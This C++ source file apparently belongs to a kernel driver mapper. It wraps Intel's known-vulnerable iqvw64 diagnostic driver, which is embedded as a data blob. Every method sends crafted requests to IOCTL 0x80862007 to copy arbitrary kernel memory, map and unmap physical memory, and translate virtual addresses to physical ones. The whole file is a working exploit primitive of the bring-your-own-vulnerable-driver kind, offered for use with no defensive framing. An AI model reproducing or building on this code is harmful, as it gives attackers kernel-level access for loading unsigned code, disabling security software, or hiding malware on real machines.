#include "iqvw64_driver.hpp"

#include <spdlog/spdlog.h>
#include <vulnerables/iqvw64_data.hpp>

Iqvw64Driver::Iqvw64Driver(std::string_view symbLink)
    : BasicVulnDriver(std::move(symbLink))
{
}

ULONG Iqvw64Driver::GetTimeStamp() const
{
    return 0x5284EAC3;
}

const std::vector<uint8_t>& Iqvw64Driver::GetData() const
{
    return iqvw64_data;
}

bool Iqvw64Driver::KeMemMove(uintptr_t dist, uintptr_t src, std::size_t size) const
{
    struct CopyMemoryRequest {
        char option;
        char pad0[0xF];
        uintptr_t src;
        uintptr_t dist;
        std::size_t size;
    };

    static_assert(offsetof(CopyMemoryRequest, option) == 0x0);
    static_assert(offsetof(CopyMemoryRequest, src) == 0x10);
    static_assert(offsetof(CopyMemoryRequest, dist) == 0x18);
    static_assert(offsetof(CopyMemoryRequest, size) == 0x20);

    CopyMemoryRequest request = { 0 };
    request.option = 0x33;
    request.src = src;
    request.dist = dist;
    request.size = size;

    return SendIoRequest<CopyMemoryRequest>(0x80862007, request);
}

bool Iqvw64Driver::KeUnmapIoSpace(uintptr_t virtualAddr, std::size_t size) const
{
    struct UnmapIoSpaceRequest {
        char option;
        char pad0[0x9];
        uintptr_t retval;
        uintptr_t virtualAddr;
        uintptr_t physicalAddr;
        std::size_t size;
    };

    static_assert(offsetof(UnmapIoSpaceRequest, option) == 0x0);
    static_assert(offsetof(UnmapIoSpaceRequest, retval) == 0x10);
    static_assert(offsetof(UnmapIoSpaceRequest, virtualAddr) == 0x18);
    static_assert(offsetof(UnmapIoSpaceRequest, physicalAddr) == 0x20);
    static_assert(offsetof(UnmapIoSpaceRequest, size) == 0x28);

    UnmapIoSpaceRequest request = { 0 };
    request.option = 0x1A;
    request.virtualAddr = virtualAddr;
    request.size = size;

    if (!SendIoRequest<UnmapIoSpaceRequest>(0x80862007, request)) {
        spdlog::error("Failed to unmap address: 0x{:X}", virtualAddr);
        return false;
    }

    return true;
}

uintptr_t Iqvw64Driver::KeMapIoSpace(uintptr_t physicalAddr, std::size_t size) const
{
    struct MapIoSpaceRequest {
        char option;
        char pad0[0x9];
        uintptr_t retval;
        uintptr_t virtualAddr;
        uintptr_t physicalAddr;
        std::size_t size;
    };

    static_assert(offsetof(MapIoSpaceRequest, option) == 0x0);
    static_assert(offsetof(MapIoSpaceRequest, retval) == 0x10);
    static_assert(offsetof(MapIoSpaceRequest, virtualAddr) == 0x18);
    static_assert(offsetof(MapIoSpaceRequest, physicalAddr) == 0x20);
    static_assert(offsetof(MapIoSpaceRequest, size) == 0x28);

    MapIoSpaceRequest request = { 0 };
    request.option = 0x19;
    request.physicalAddr = physicalAddr;
    request.size = size;

    if (!SendIoRequest<MapIoSpaceRequest>(0x80862007, request)) {
        spdlog::error("Failed to map io space for physical address: 0x{:X}", physicalAddr);
        return 0;
    }

    return request.virtualAddr;
}

uintptr_t Iqvw64Driver::KeGetPhysicalAddress(uintptr_t virtualAddr) const
{
    struct Virtual2PhysicalRequest {
        char option;
        char pad0[0xF];
        uintptr_t physicalAddr;
        uintptr_t virtualAddr;
    };

    static_assert(offsetof(Virtual2PhysicalRequest, option) == 0x0);
    static_assert(offsetof(Virtual2PhysicalRequest, physicalAddr) == 0x10);
    static_assert(offsetof(Virtual2PhysicalRequest, virtualAddr) == 0x18);

    Virtual2PhysicalRequest request = { 0 };
    request.option = 0x25;
    request.virtualAddr = virtualAddr;

    if (!SendIoRequest<Virtual2PhysicalRequest>(0x80862007, request)) {
        spdlog::error("Failed to translate virtual address 0x{:X} to physical", virtualAddr);
        return 0;
    }

    return request.physicalAddr;
}